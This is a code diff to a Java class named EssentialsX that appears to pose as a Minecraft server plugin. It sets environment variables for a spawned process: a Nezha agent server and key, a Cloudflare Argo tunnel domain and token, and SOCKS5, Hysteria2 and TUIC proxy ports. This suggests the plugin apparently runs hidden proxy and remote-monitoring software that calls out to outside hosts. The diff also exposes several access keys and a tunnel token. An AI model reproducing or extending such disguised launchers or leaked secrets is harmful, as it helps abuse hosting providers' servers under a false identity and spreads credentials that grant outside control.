@@ -73,14 +73,14 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "101c704f-1cd9-4e05-aa1b-62a2a65e056d");
+        env.put("UUID", "a36f24af-a1f2-4235-86c9-96b4bfa5c6e3");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezha.babiq.eu.org");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "AQZxeiz8HFGpwzgeYk");
+        env.put("NEZHA_KEY", "0ZSxg59BP1rSkThZOh");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "godlike.future13800.eu.org");
-        env.put("ARGO_AUTH", "eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiZWM3NThjY2QtNDA0MC00ODQ3LThhN2YtZDU2ZDJlMDMyYTQ1IiwicyI6IllURmlNbVZtTVRJdE1UQTRPQzAwTkRZeExUazFZbU10TnpNd09UaGlOV016TURrNSJ9");
+        env.put("ARGO_DOMAIN", "");
+        env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "20096");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
